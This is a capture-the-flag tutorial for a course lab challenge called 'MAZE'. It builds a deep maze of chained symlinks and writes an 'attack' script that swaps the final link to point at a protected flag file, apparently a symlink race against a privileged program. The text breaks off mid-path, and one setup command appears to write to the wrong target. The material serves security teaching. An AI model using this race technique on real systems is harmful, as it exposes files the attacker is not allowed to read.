# CTF 3 - MAZE

This is a tutorial to solve the third CTF challenge

## SETUP

1. Deploy your challenge instance
1. Open a terminal and connect to your instance with:

    ``` bash
    ssh {unix_username}@syssec-lab.s3.eurecom.fr -p {port_number}
    ```

1. Create the maze by copying to following code in your terminal (this process can take several minutes):

    ```bash
    depth=1900
    chain=15
    cur_dir=$(pwd)

    base_link="$(for i in $(seq -s" " 1 $depth); do echo "d/"; done | tr -d '\r\n')"
    #echo $base_link;

    for (( i = 0; i < $chain; i++ ))
    do mkdir $i
      cd $i
      mkdir -p $base_link
      cd ..
    done;

    for (( i = 0; i < $(( $chain-1 )); i++ ))
    do path="$cur_dir""/""$i""/""$base_link"
      j=$(( $i + 1 ))
      dst="$cur_dir""/""$j""/""$base_link"
      cd $path
      ln -s $dst lnk
    done;
    entry_dst=$cur_dir"/0/"$base_link
    cd $cur_dir
    ln -f -s $entry_dst entry

    pub_path=$cur_dir"/txt.txt"
    cd $cur_dir"/14/"$base_link
    ln -f -s $pub_path lnk
    ```

1. Check if the process succeed:

    ```bash
    # Your current path should be /home/{unix_username}/14/d/d/d/d.../d
    echo "The maze has been created !" > /home/{unix_username}
    cat lnk
    ```

    Your text must be printed

    ```bash
    The maze has been created !
    ```

    If a problem occured, destroy your challenge instance and try again

1. Go back in you home directory and create your **[`attack`](attack.txt)** executable:

    ```bash
    cd /home/{unix_username}
    ```

    ```bash
    echo "rm /home/{unix_username}/14/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/lnk
    ln -s /home/{unix_username}/maze/flag /home/{unix_username}/14/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/lnk" > attack;
    chmod u+x attack;
    ```

1. Create your **[`recover`](recover.txt)** executable:

    ```bash
    echo "rm /home/{unix_username}/14/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/lnk
    ln -s /home/{unix_username}/txt.txt /home/{unix_username}/14/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/